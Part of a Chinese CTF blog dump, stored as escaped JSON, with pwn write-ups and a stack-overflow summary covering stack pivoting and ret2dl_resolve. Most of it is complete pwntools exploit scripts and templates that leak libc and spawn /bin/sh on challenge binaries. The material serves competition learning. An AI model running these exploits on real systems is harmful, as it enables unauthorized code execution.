dockerDbg():\n\tmyGdb = remote(\"127.0.0.1\",30001)\n\tmyGdb.close()\n\tpause()\n\ndef dbg():\n\tgdb.attach(p)\n\tpause()\n\ndef lg(string,addr):\n    print('\\033[1;31;40m%20s-->0x%x\\033[0m'%(string,addr))\n\n\ndef add():\n\tp.recvuntil('Give me your choice : ')\n\tp.sendline('1')\n\nmain_addr = 0x0804973F\n#pop ebx ; pop esi ; pop edi ; pop ebp ; ret\npop_ebx_esi_edi_ebp_ret=0x08049810\nru('Input your name:')\n\n#leak libc\npayload=0x22*'PIG007NB'\npayload += p32(pop_ebx_esi_edi_ebp_ret)\npayload += p32(1)*4\npayload += p32(elf.plt['puts'])\npayload += p32(main_addr)\npayload += p32(elf.got['puts'])\n\nsl(payload)\n#debug()\n\nputs_addr = u32(ru('\\xf7')[-4:])\nobj = LibcSearcher(\"puts\", puts_addr)\nlibc_base = puts_addr-obj.dump('puts')\n\nlg('libc_base',libc_base)\n\n\nmalloc_hook_addr = libc_base + obj.dump(\"__malloc_hook\")\nfree_hook_addr = libc_base + obj.dump(\"__free_hook\")\nread_addr  = libc_base + obj.dump(\"read\")\nopen_addr  = libc_base + obj.dump(\"open\")\nwrite_addr  = libc_base + obj.dump(\"write\")\nlg('__malloc_hook',malloc_hook_addr)\nlg('free_hook_addr',free_hook_addr)\nlg('read_addr',read_addr)\nlg('open_addr',open_addr)\nlg('write_addr',write_addr)\n\nru('Input your name:')\npayload=0x22*'PIG007NB'\npayload += p32(pop_ebx_esi_edi_ebp_ret)\npayload += p32(1)*4\npayload += p32(read_addr)\npayload += p32(main_addr)\npayload += p32(0)\npayload += p32(0x0804C000)\npayload += p32(0x6)\nsl(payload)\n\nsl('flag\\x00')\n\nru('Input your name:')\npayload=0x22*'PIG007NB'\npayload += p32(pop_ebx_esi_edi_ebp_ret)\npayload += p32(1)*4\npayload += p32(open_addr)\npayload += p32(main_addr)\npayload += p32(0x0804C000)\npayload += p32(2)\nsl(payload)\n\n\nru('Input your name:')\npayload=0x22*'PIG007NB'\npayload += p32(pop_ebx_esi_edi_ebp_ret)\npayload += p32(1)*4\npayload += p32(read_addr)\npayload += p32(main_addr)\npayload += p32(3)\npayload += p32(free_hook_addr)\npayload += p32(0x30)\nsl(payload)\n\n\nru('Input your name:')\npayload=0x22*'PIG007NB'\npayload += p32(pop_ebx_esi_edi_ebp_ret)\npayload += p32(1)*4\npayload += p32(write_addr)\npayload += p32(main_addr)\npayload += p32(1)\npayload += p32(free_hook_addr)\npayload += p32(0x30)\nsl(payload)\n\np.interactive()\n\n#flag{20baa3d800326274c965041777012d12}\n```\n\n# 五、pwn1\n\n脑瘫原题 ciscn 2018 supermarket\n\n```python\n# -*- coding:UTF-8 -*-\n\nfrom pwn import *\nfrom LibcSearcher import *\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'i386'\nSigreturnFrame(kernel = 'i386')\n\nbinary = \"./task_supermarket\"\ncontext.binary = binary\nlibc = ELF(context.binary.libc.path)\n#elf = ELF(binary)\ncontext.timeout = 0.2\n\n\n\nlocal = 0\nif local:\n    p = process(binary)\n    #p = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './hello'], env={\"LD_PRELOAD\":\"/glibc/2.24/64/lib/libc-2.24.so\"})\n    elf = ELF(binary)\nelse:\n    p = remote(\"182.116.62.85\",\"27518\")\n    elf = ELF(binary)\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\nuu32    = lambda data   :u32(data.ljust(4, '\\0'))\nuu64    = lambda data   :u64(data.ljust(8, '\\0'))\nu64Leakbase = lambda offset :u64(ru(\"\\x7f\")[-6: ] + '\\0\\0') - offset\nu32Leakbase = lambda offset :u32(ru(\"\\xf7\")[-4: ]) - offset\nit      = lambda                    :p.interactive()\n\nmenu = 'your choice>>'\n\ndef dockerDbg():\n    myGdb = remote(\"127.0.0.1\",30001)\n    myGdb.close()\n    pause()\n\ndef add(index, size, content):\n    sla(menu, '1')\n    sla('name:', str(index))\n    sla('price:', '10')\n    sla('descrip_size:', str(size))\n    sla('description:', content)\n\n\ndef delete(index):\n    sla(menu, '2')\n    sla('name:', str(index))\n\n\ndef list():\n    sla(menu, '3')\n\n\ndef edit(index, size, content):\n    sla(menu, '5')\n    sla('name:', str(index))\n    sla('descrip_size:', str(size))\n    sla('description:',content)\n\n\natoi_got = elf.got['atoi']\n\n\nadd(0, 0x80, 'PIG007NB' * 2)\nadd(1, 0x20, 'PIG007NB' * 2)\nedit(0, 0x90, '')\nadd(2, 0x20, 'PIG007NB' * 2)\npayload = \"\"\n#payload += '2'.ljust(16,'\\x00')\npayload += p64(0x32)\npayload += p64(0x0)\n#--------------------------\npayload += p32(20)\npayload += p32(0x20)\npayload += p32(atoi_got)\n\nedit(0, 0x80, payload)\nlist()\nru('2: price.20, des.')\n\natoi_addr = u32(rc(4).ljust(4,'\\x00'))\nobj = LibcSearcher('atoi', atoi_addr)\nlibc_base = atoi_addr - obj.dump('atoi')\nsystem_addr = libc_base + obj.dump('system')\nedit(2, 0x20, p32(system_addr))\nsla(menu, '/bin/sh')\n\np.interactive()\n#flag{03b1baaab2a949db11f8b1c02a4f7ab6}\n```\n\n","tags":["比赛"],"categories":["比赛"]},{"title":"栈溢出总结","url":"/2021/10/22/栈溢出总结/","content":"\n\n\n# 前言\n\n总结复习一下各种各样的栈溢出。\n\n# 一、栈迁移\n\n`美团2021-12 babyrop`\n\n## 1.题目简介\n\n![image-20211212144541080](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211212144548.png)\n\n+ 溢出16个字节，可覆盖rbp和返回地址\n\n+ 存在puts等打印函数\n\n+ 无好用gadget，只有最常见的csu\n\n+ 存在canary，可用数据长度为0x18\n\n+ 关键函数：\n\n  ![image-20211212145246326](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211212145246.png)\n\n## 2.利用方式\n\n由于没办法写GOT，考虑栈迁移之后调用puts函数泄露地址，然后进行`one_gadget`\n\n### (1)迁移数据\n\n所以直接迁移到`extern`段之后的数据段\n\n### (2)调试调用\n\n#### ①栈劫持\n\n```python\npayload = \"\"\npayload += 'PIG007NB'*(0x18/0x8)\n\npayload += p64(canary)\npayload += p64(new_stack)\npayload += p64(0x40072E)\n```\n\n初次栈溢出`leave_ret`之后劫持`rbp`，再进入`vuln`函数，借助修改之后的`rbp`向新栈读入数据\n\n```python\n#读入数据之后溢出\npayload = \"\"\npayload += 'PIG007NB'*(0x18/0x8)\n\npayload += p64(canary)\npayload += p64(new_stack+0x28)\npayload += p64(0x40072E)\n```\n\n![image-20211212145349774](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211212145349.png)\n\n再次栈溢出修改`rbp`向新栈读入数据，同时通过`leave_ret`劫持`rsp`\n\n\n\n![image-20211212145552478](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211212145552.png)\n\n![image-20211212150141800](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211212150141.png)\n\n同时需要注意的是，劫持rsp之后，再调用read函数时，其返回地址也会随之改变，所以我们需要劫持read函数的返回地址，通过修改的rbp即可在read函数的返回地址上读入ROP链条\n\n##### ▲leave-ret\n\n相当于如下命令\n\n```\nmov     rsp rbp\npop     rbp\npop     rip\n```\n\n##### ▲call\n\n相当于如下\n\n```\npush \t\trip\njmp   \t\tfunc_addr\n```\n\n\n\n#### ②读入ROP链\n\n向read函数的返回地址读入ROP链条，这个rbp是经过计算的，由于之前的rsp通过`leave-ret`变为了new_stack+0x10，所以在调用`call read`时，压入返回地址，导致rsp变为new_stack+0x08，而返回地址也就是保存在new_stack+0x08处，所以我们需要修改新的rbp为new_stack+0x28，才能在vuln函数中向new_stack+0x08读入ROP链条从而劫持read函数的返回地址。\n\n![image-20211212151538794](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211212151539.png)\n\n#### ③劫持vuln函数返回地址\n\n这样在之后调用完puts函数之后就可以再返回到vuln函数中，新建一个函数栈来劫持该函数的返回地址\n\n```python\npayload = \"\"\npayload += p64(pop_rdi_ret)\npayload += p64(puts_got)\npayload += p64(puts_plt)\npayload += p64(0x400717)\n\n#dbg()\nsd(payload)\n\nlibc_base = u64Leakbase(libc.sym['puts'])\none_gadget = libc_base + 0x10a41c\nlg(\"libc_base\",libc_base)\n\npayload = 'PIG007NB'*(0x18/0x8)\npayload += p64(canary)\npayload += 'PIG007NB'\npayload += p64(one_gadget)\n```\n\n同样由于rbp和rsp没有改变，所以也可以通过再返回到`0x40072e`来劫持read函数的返回地址\n\n```python\npayload = \"\"\npayload += p64(pop_rdi_ret)\npayload += p64(puts_got)\npayload += p64(puts_plt)\npayload += p64(0x40072e)\n\n#dbg()\nsd(payload)\n\nlibc_base = u64Leakbase(libc.sym['puts'])\none_gadget = libc_base + 0x10a41c\nlg(\"libc_base\",libc_base)\n\npayload = 'PIG007NB'*(0x18/0x8)\npayload += p64(one_gadget)\n```\n\n## 3.总结\n\n栈迁移的方法多种多样，需要注意的就是两个命令`leave-ret`和`call`，这两个命令对栈的影响是最大的，自己比赛的时候基本都忘光了，调试了好久，同时要记住调用函数时，如果rsp被劫持了，那么其返回地址也会被劫持。\n\n\n\n# 二、Ret2dl_resolve\n\n之前做过总结，但是还是有点皮毛，这回深入总结一下，具体原理就先不说了，主要说下注意的几点事项。\n\n## 1.No RELRO模式\n\n见题目`HITCTF slient`\n\n+ 可任意修改四个字节\n+ 溢出长度不太够\n+ 无法泄露地址\n+ 无PIE\n\n这种模式可用劫持`.dynstr`，也就是需要改写`DT_STRTAB`上的指针，使其指向`fake_dynstr`。在32位和64位下都是通用的。\n\n### (1)寻找`.dynstr`指针\n\n```bash\nreadelf -S pwn\n```\n\n![image-20211119171711269](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211119171711.png)\n\n找到如上图的.dynamic，其地址为`0x600988`，在IDA中查看。\n\n![image-20211119171809731](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211119171809.png)\n\n上图的`DT_STRTAB`即为所寻找的地址，其内容为\n\n![image-20211119171935731](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211119171935.png)\n\n蓝色代表偏移，红色代表需要动态加载时寻址的函数字符串的地址，之后查看对应的字符串内容。\n\n![image-20211119172058537](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211119172058.png)\n\n需要修改为如下\n\n![image-20211212165434233](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211212165546.png)\n\n我们需要做的就是劫持这个`DT_STRTAB`中的字符串指针。但是劫持这个指针需要满足为`NO RELRO`的保护级别才行，不能开启`RELRO`。\n\n### (2)劫持指针\n\n这里一般只能通过使用任意写来修改，或者可以借助read函数栈迁移修改rbp来劫持，将该指针修改为我们写入的system_str的地址减去0x11处，一般都是这样的，重载read函数为system函数，因为read函数一般都会有。\n\n### (3)重载函数\n\n查找重载的plt进行调用即可，在IDA中`ctrl+s`即可\n\n![image-20211212165518078](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211212165518.png)\n\n```python\nstrtab_addr = 0x600A08\ncommand_addr = 0x600C00\nsystem_str_addr = command_addr + 8\n\n#ret2dlresolve\npop_rdi_ret = 0x4007d3\nplt0 = 0x4004E0\n#command_addr即binsh_addr\npayload = \"a\"*0x38 + p64(pop_rdi_ret) + p64(command_addr) + p64(plt0) + \\\n    p64(0)\n#dbg()\np.sendline(payload)\n#pause()\np.interactive()\n```\n\n## 2.Partial RELRO模式\n\n这种模式有好几个区分度\n\n### (1)原生态的32位\n\n即在32位架构机器上编译的32位程序，直接借助工具一把梭哈即可，详见`SecconCTF2021-kasu_bof`\n\n```python\nfrom pwn import *\n\ndef start():\n    global p\n    if args.REMOTE:\n        p = process(\"./chall\")\n        #p = remote('hiyoko.quals.seccon.jp', 9001)\n    else:\n        p = elf.process()\n\ncontext.binary = elf = ELF(\"./chall\")\nlibc = elf.libc\n\ndl_resolve = Ret2dlresolvePayload(elf, \"system\", [\"/bin/sh\"])\n\nr = ROP(elf)\nr.gets(dl_resolve.data_addr)\nr.ret2dlresolve(dl_resolve)\n\nstart()\n\noff_eip = 0x88\np.sendline(b'A'*(off_eip) + r.chain())\nsleep(1)\np.sendline(dl_resolve.payload)\np.interactive()\np.close()\n```\n\n如果换成了read函数，直接更改为`r.read(0,dl_resolve.data_addr,0x400)`即可\n\n读取之后返回到plt0，之后劫持栈上数据\n\n![image-20211216141615732](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211216141616.png)\n\n通过fake_Elf32_Rel_addr来获取到fake_Elf32_Sym_addr进行重载，在之后的`_dl_fixup`函数中重载相关函数。\n\n![image-20211216141922860](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211216141923.png)\n\n进入system函数\n\n![image-20211216142029092](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211216142212.png)\n\n即可调用system('/bin/sh')\n\n![image-20211216142052187](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211216142226.png)\n\n\n\n### (2)64位机器编译的32位程序\n\n+ 溢出长度足够\n+ 存在可以输入数据的bss段\n\n这种情况一般需要一个我们能够将数据输入到bss段的功能，从而能够直接劫持栈。原因就是在这种情况下同一段代码编译之后会出现不同的效果，代码为：\n\n```C\n#include <unistd.h>\n#include <string.h>\n\nchar buf[0x500];\n\nint main(void)\n{\n    char dest[0x10];\n    //gets(buf);\n    int n = read(0,buf,0x500);\n    memcpy(dest,buf,0x500);\n    return 0;\n}\n```\n\n#### ①原生态32位效果\n\n这个环境中\n\n![image-20211213105819379](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211213105826.png)\n\n#### ②64位机器编译32位程序效果\n\n![image-20211213110012402](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211213110012.png)\n\n相比较原先的原生态，会多出来一些汇编代码，比较明显的就是`lea     esp, [ecx-4]`，这个详见Migraine殇师傅的文章\n\n[在PWN题中绕过lea esp以及关于Ret2dl的一些补充 - 安全客，安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/187875)\n\n有的时候也会编译出如下代码\n\n![image-20211213205819971](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211213205820.png)\n\n这时候就需要我们灵活变通，通过修改栈上的数据，进而控制ecx，再控制esp，这样就可以直接栈迁移，从而在我们存放数据的地方进行ROP。\n\n#### ③通过ecx劫持esp\n\n即如下先劫持栈到存放数据的bss段\n\n```python\ndl_resolve = Ret2dlresolvePayload(elf, \"system\", [\"/bin/sh\"])\nr = ROP(elf)\n#r.read(0,dl_resolve.data_addr,0x400)\nr.gets(dl_resolve.data_addr)\nr.ret2dlresolve(dl_resolve)\n\nstack_space = 0x280\noffset_ebp = 0x28\nbuf_addr = 0x0804A040\nROP_chain_addr = buf_addr + stack_space\n\npayload = ''\npayload += \"A\"*(offset_ebp - 0x10)\n#pop ecx的时候esp指向该地址，将该地址赋给ecx，从而通过lea esp,[ecx-4]劫持esp\npayload += p32(ROP_chain_addr + 0x4)\npayload = payload.ljust(stack_space,'\\x00')\npayload += r.chain()\n```\n\n这样就能通过ecx控制esp，从而跳转到我们位于bss段上的ROP链\n\n![image-20211213215116117](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211213215116.png)\n\n之后就是类似的了。\n\n![image-20211216142835635](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211216143113.png)\n\n找到system函数\n\n![image-20211216142921537](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211216143131.png)\n\n调用对应system('/bin/sh')\n\n![image-20211216143224584](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211216143225.png)\n\n#### 🔺注\n\n但是这里就会有点不太好，就是如果劫持之后的esp就在buf首地址附近，那么在之后的重定向过程中，会调用一系列函数，那么在生成函数栈空间的时候栈顶就会一直向上移动，从而覆盖到不能覆盖的地方，导致出错\n\n![image-20211213214635928](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211213214636.png)\n\n可以看到该地址已经在存放重定向表的LOAD段了。\n\n![image-20211213214833969](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211213214834.png)\n\n所以我们之前就设置了存放ROP链的数据在bss段首地址大约0x280的地方，这样基本就不会覆盖了，其实最好能够再长就再长一些，也不会有什么坏处。\n\n```python\nstack_space = 0x280\nbuf_addr = 0x0804A040\nROP_chain_addr = buf_addr + stack_space\n```\n\n完整exp如下\n\n```python\n# -*- coding:UTF-8 -*-\nfrom pwn import *\np = process(\"./ret2dl_re32_gets\")\nelf = context.binary = ELF(\"./ret2dl_re32_gets\")\nplt0_addr = elf.get_section_by_name(\".plt\")[\"sh_addr\"]\n\ndynstr_addr, dynsym_addr, relplt_addr = map(elf.dynamic_value_by_tag,\n                                                      [\"DT_STRTAB\", \"DT_SYMTAB\", \"DT_JMPREL\"])\nprint(\"plt0:\", hex(plt0_addr))\nprint(\".dynstr:\", hex(dynstr_addr))\nprint(\".dynsym:\", hex(dynsym_addr))\nprint(\".rel.plt:\", hex(relplt_addr))\n\ndef dbg():\n    global p\n    gdb.attach(p)\n    pause()\n\ndef gdb_a(addr):\n    gdb.attach(p, \"b *{0} \\n c\".format(addr))\n    sleep(0.5)\n\n\ndl_resolve = Ret2dlresolvePayload(elf, \"system\", [\"/bin/sh\"])\nr = ROP(elf)\n#r.read(0,dl_resolve.data_addr,0x400)\nr.gets(dl_resolve.data_addr)\nr.ret2dlresolve(dl_resolve)\n\n\n# .text:0804846E                 lea     esp, [ebp-10h]\n# .text:08048471                 pop     ecx\n# .text:08048472                 pop     ebx\n# .text:08048473                 pop     esi\n# .text:08048474                 pop     edi\n# .text:08048475                 pop     ebp\n# .text:08048476                 lea     esp, [ecx-4]\n# .text:08048479                 retn\n#由于会劫持esp到buf处，所以最好留出大约0x280或以上的空间来为重定向的一系列函数\n#留出栈空间，不然就可能会使得esp放到buf段上面，覆盖到不能覆盖的地方\nstack_space = 0x280\noffset_ebp = 0x28\nbuf_addr = 0x0804A040\nROP_chain_addr = buf_addr + stack_space\n\npayload = ''\npayload += \"A\"*(offset_ebp - 0x10)\n#pop ecx的时候esp指向该地址，将该地址赋给ecx，从而通过lea esp,[ecx-4]劫持esp\npayload += p32(ROP_chain_addr + 0x4)\npayload = payload.ljust(stack_space,'\\x00')\npayload += r.chain()\n\ngdb_a(0x08048464)\np.sendline(payload)\npause()\nsleep(1)\np.sendline(dl_resolve.payload)\np.interactive()\n```\n\n### (3)原生态64位\n\n这个就比较正常了，一般是两种模式\n\n#### ①有read和泄露函数\n\n这个就是最正常的ret2dl_resolve，直接拿模板打即可，参照bsauce师傅的模板\n\n不过这个read换成gets好像不太好使，也可能是没设置好，**回头试试**\n\n[32位/64位dlresolve最全总结（不用泄露地址-执行one_gadget） - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/5722#toc-2)\n\n```python\n#!/usr/bin/python\n#coding:utf-8\nfrom pwn import *\n\n#需修改:文件名、溢出偏移、leave_ret地址\nfpath = './myRet2dl_puts'\nelf = ELF(fpath)\np = process(fpath)\n\noffset_rbp = 0x80\n#读取长度\nlength = 0x400\nstack_size = 0x800\n#main函数中找\nleave_ret=0x40066A\n\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\nuu32    = lambda data   :u32(data.ljust(4, '\\0'))\nuu64    = lambda data   :u64(data.ljust(8, '\\0'))\nu64Leakbase = lambda offset :u64(ru(\"\\x7f\")[-6: ] + '\\0\\0') - offset\nu32Leakbase = lambda offset :u32(ru(\"\\xf7\")[-4: ]) - offset\nit      = lambda                    :p.interactive()\n\n\ndef lg(string,addr):\n    print('\\033[1;31;40m%20s-->0x%x\\033[0m'%(string,addr))\n\n\ndef gdb_a(addr):\n    gdb.attach(p, \"b *{0} \\n c\".format(addr))\n    sleep(0.5)\n\ndef makecall(addr, rdi,rsi,rdx,tail = 0):\n    payload = ''\n    payload += p64(p6_addr)\n    payload += p64(0x0)\n    payload += p64(0x1)\n    payload += p64(addr)\n    payload += p64(rdi)\n    payload += p64(rsi)\n    payload += p64(rdx)\n    payload += p64(call_addr)\n    if (tail):\n        payload += p64(0x0) * 7 + p64(tail)\n    return payload\n\n\nmain_addr=elf.sym['main']\np6_addr=elf.sym['__libc_csu_init'] + 0x5a\ncall_addr=elf.sym['__libc_csu_init'] + 0x40\np_rdi_ret=elf.sym['__libc_csu_init'] + 0x63\np_rbp_ret=elf.sym['register_tm_clones'] + 0x38\n\ncmd = \"/bin/sh\"\nplt_0 = elf.get_section_by_name(\".plt\")[\"sh_addr\"]\ndynstr, dynsym, rel_plt = map(elf.dynamic_value_by_tag,\n                                                      [\"DT_STRTAB\", \"DT_SYMTAB\", \"DT_JMPREL\"])\n\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\n# write_got = elf.got['write']\n# write_plt = elf.plt['write']\nread_got=elf.got['read']\nread_plt = elf.plt['read']\ngot_8=elf.get_section_by_name('.got.plt').header.sh_addr+8   #0x601008\nbss_addr =elf.get_section_by_name('.bss').header.sh_addr\nbase_stage = bss_addr + stack_size\n#print 'got_8=',hex(got_8)\n\nlg(\"main_addr\",main_addr)\nlg(\"p6_addr\",p6_addr)\nlg(\"p_rdi_ret\",p_rdi_ret)\nlg(\"p_rbp_ret\",p_rbp_ret)\nlg(\"plt_0\",plt_0)\nlg(\"dynstr\",dynstr)\nlg(\"dynsym\",dynsym)\nlg(\"rel_plt\",rel_plt)\nlg(\"puts_got\",puts_got)\nlg(\"puts_plt\",puts_plt)\n# lg(\"write_got\",write_got)\n# lg(\"write_plt\",write_plt)\nlg(\"read_got\",read_got)\nlg(\"read_plt\",read_plt)\nlg(\"got_8\",got_8)\nlg(\"bss_addr\",bss_addr)\nlg(\"base_stage\",base_stage)\n\n#p.recvuntil(\"Welcome!\\n\")        # 'Welcome to XDCTF2015~!\\n'\n#1.泄露&link_map地址\npayload='\\x00'*offset_rbp\npayload+='\\x00'*8\npayload+=makecall(puts_got,got_8,0,0,tail=main_addr)\n#payload+=makecall(write_got,1,got_8,8,tail=main_addr)\n#这length看具体情况，没啥用\npayload=payload.ljust(length,'\\x00')\n#gdb_a(0x400674)\np.send(payload)\n#p.send(payload)\n#p.interactive()\n#pause()\nlink_map = u64Leakbase(0)\n#pause()\nprint 'link_map=',hex(link_map)\n\n#2.往link_map+0x1c8写0\npayload='\\x00'*offset_rbp\npayload+='\\x00'*8\npayload+=makecall(read_got,0,link_map+0x1c8,8,tail=main_addr)\n#这length看具体情况，没啥用\npayload=payload.ljust(length,'\\x00')\np.send(payload)\np.send(p64(0))\n\n#3.往base_stage写入伪造结构并跳过去\npayload='\\x00'*offset_rbp\npayload+='\\x00'*8\npayload+=makecall(read_got,0,base_stage,0xd0,tail=0)   #假设结构大小是400\npayload+=p64(0)*2+p64(base_stage)+p64(0)*4\npayload+=p64(leave_ret)\n#这length看具体情况，没啥用\npayload=payload.ljust(length,'\\x00')\np.send(payload)\n\n\n#4.bss数据：rop-参数放在寄存器/ 伪造结构  \n#(1)确定各个节的地址 \n\n#(2)确定重定位下标\nindex_offset = base_stage + 7*8\nalign = 24 - ((index_offset-rel_plt) % 24)  # 这里的对齐操作是因为dynsym里的ELF64_R_SYM结构体都是24字节大小\nindex_offset = index_offset + align\nindex = (index_offset - rel_plt) / 24 # base_stage + 7*8 指向fake_reloc，减去rel_plt即偏移\n#(3)确定动态链接符号下标\nfake_sym_addr = base_stage + 13*8\nalign = 24 - ((fake_sym_addr - dynsym) % 24)# 这里的对齐操作是因为dynsym里的Elf64_Sym结构体都是24字节大小\nfake_sym_addr = fake_sym_addr + align\nindex_dynsym = (fake_sym_addr - dynsym) / 24 # 除以24因为Elf64_Sym结构体的大小为24，得到write的dynsym索引号\n#(4)伪造重定位结构+动态链接结构\nr_info = (index_dynsym << 32) | 0x7\nfake_reloc = p64(puts_got) + p64(r_info) + p64(0)\n#fake_reloc = p64(write_got) + p64(r_info) + p64(0)\nst_name = (fake_sym_addr + 24) - dynstr   #fake_sym（Elf32_Sym结构体）大小0x10\nfake_sym = p32(st_name) + p32(0x12) + p64(0) + p64(0)\n\npayload2 = 'AAAAAAAA'\npayload2 += p64(p_rdi_ret)\npayload2 += p64(base_stage+0xc0)   #/bin/sh\npayload2 += p64(plt_0)\npayload2 += p64(index)       #jmprel 下标参数\npayload2 += 'AAAAAAAA'       #返回地址\npayload2 += 'aaaaaaaa'\n\npayload2 = payload2.ljust(index_offset-base_stage,'B')\npayload2 += fake_reloc # index_offset(base_stage+7*8)的位置\npayload2 = payload2.ljust(fake_sym_addr-base_stage,'B')\npayload2 += fake_sym   # fake_sym_addr(base_stage+9*8)的位置\n\npayload2 += \"system\\x00\"\npayload2 = payload2.ljust(0xc0,'\\x00')\npayload2 += cmd + '\\x00'\npayload2 = payload2.ljust(0xd0,'\\x00')\n#gdb.attach(p,'b *0x4006ab')\nraw_input('wait!!\\n')\np.send(payload2)\np.interactive()\n```\n\n如果是puts函数则直接对应修修补补即可\n\n#### ②只有read和libc文件\n\n这个最开始的题目好像是0CTF的题目blackhole2，这种情况也可以对应拿模板打，原理就是调用libc中的one_gadget来getshell。这个模板也是参照bsauce师傅的模板。\n\n```python\n#!/usr/bin/python\n#coding:utf-8\nfrom pwn import *\n\n#需修改:文件名、溢出偏移、gadget地址、各节地址\nfpath = './bstack'\nelf = ELF(fpath)\nlibc = elf.libc\n#libc = ELF('./libc.so.6')\np = process(fpath)\n\n\noffset_rbp = 0x70\nlength = 0x100\nstack_size = 0x800\nleave_ret=0x00000000004006AB\n#one_gadget工具来找\none_gadget = 0x4f432\nvuln_addr=0x400676\n\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\nuu32    = lambda data   :u32(data.ljust(4, '\\0'))\nuu64    = lambda data   :u64(data.ljust(8, '\\0'))\nu64Leakbase = lambda offset :u64(ru(\"\\x7f\")[-6: ] + '\\0\\0') - offset\nu32Leakbase = lambda offset :u32(ru(\"\\xf7\")[-4: ]) - offset\nit      = lambda                    :p.interactive()\n\ndef lg(string,addr):\n    print('\\033[1;31;40m%20s-->0x%x\\033[0m'%(string,addr))\n\ndef gdb_a(addr):\n    gdb.attach(p, \"b *{0} \\n c\".format(addr))\n    sleep(0.5)\n\n\ndef makecall(addr, rdi, rsi, rdx, tail = 0):\n    payload = ''\n    payload += p64(p6_addr)\n    payload += p64(0x0)\n    payload += p64(0x1)\n    payload += p64(addr)\n    payload += p64(rdx)\n    payload += p64(rsi)\n    payload += p64(rdi)\n    payload += p64(call_addr)\n    if (tail):\n        payload += p64(0x0) * 7 + p64(tail)\n    return payload\n\n\n\nplt_0 = elf.get_section_by_name(\".plt\")[\"sh_addr\"]\np6_addr=elf.sym['__libc_csu_init'] + 0x5a\ncall_addr=elf.sym['__libc_csu_init'] + 0x40\np_rdi_ret=elf.sym['__libc_csu_init'] + 0x63\np_rbp_ret=elf.sym['register_tm_clones'] + 0x38\nread_got=elf.got['read']\nread_plt = elf.plt['read']\ngot_8=elf.get_section_by_name('.got.plt').header.sh_addr+8   #0x601008\nbss_addr =elf.get_section_by_name('.bss').header.sh_addr\nlibc_bss_addr = libc.get_section_by_name('.bss').header.sh_addr\nbase_stage = bss_addr + stack_size\nlibc_start_main_addr = libc.sym['__libc_start_main']\nfake_link_map=elf.got['__libc_start_main']    #change!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\nfake_st_value=one_gadget-libc_start_main_addr    #0x4526a   0xf02a4     0xf1147\nfake_r_offset=libc_bss_addr-libc_start_main_addr\n# fake_st_value=0x4526a-0x20740    #0x4526a   0xf02a4     0xf1147\n# fake_r_offset=0x3c5720-0x20740\n\nval_0x68=base_stage+0xc0-8    #0x600ea8\nval_0x70=base_stage+0xc0-8    #0x600eb8\nval_0xf8=base_stage+0xc0-8    #0x600f28\nwait_time=0.1\n\n#print p.recv()        # 'Welcome to XDCTF2015~!\\n'\n\n#1.往fake_link_map+0x68写值\npayload='\\x00'*offset_rbp\npayload+='\\x00'*8\npayload+=makecall(read_got,0,fake_link_map+0x68,16,tail=vuln_addr)\npayload=payload.ljust(0x100,'\\x00')\n#gdb_a(0x4006AA)\np.send(payload)\n#pause()\nsleep(wait_time)\np.send(p64(val_0x68)+p64(val_0x70))\n\n#2.往fake_link_map+0xf8写值\npayload='\\x00'*offset_rbp\npayload+='\\x00'*8\npayload+=makecall(read_got,0,fake_link_map+0xf8,8,tail=vuln_addr)\npayload=payload.ljust(0x100,'\\x00')\np.send(payload)\nsleep(wait_time)\np.send(p64(val_0xf8))\n\n#3.往base_stage写入伪造结构并跳过去\npayload='\\x00'*offset_rbp\npayload+='\\x00'*8\npayload+=makecall(read_got,0,base_stage,0xd0,tail=0)   #假设结构大小是400\npayload+=p64(0)*2+p64(base_stage)+p64(0)*4\npayload+=p64(leave_ret)\npayload=payload.ljust(0x100,'\\x00')\np.send(payload)\n\n\n#4.bss数据：rop-参数放在寄存器/ 伪造结构  \n#(1)确定各个节的地址 \nplt_1 = plt_0+6\n#(2)确定重定位下标\nalign = 24 - (56 % 24)  # 这里的对齐操作是因为dynsym里的ELF64_R_SYM结构体都是24字节大小\nindex_offset = base_stage + 7*8 + align\nindex = (7*8 + align) / 24 # base_stage + 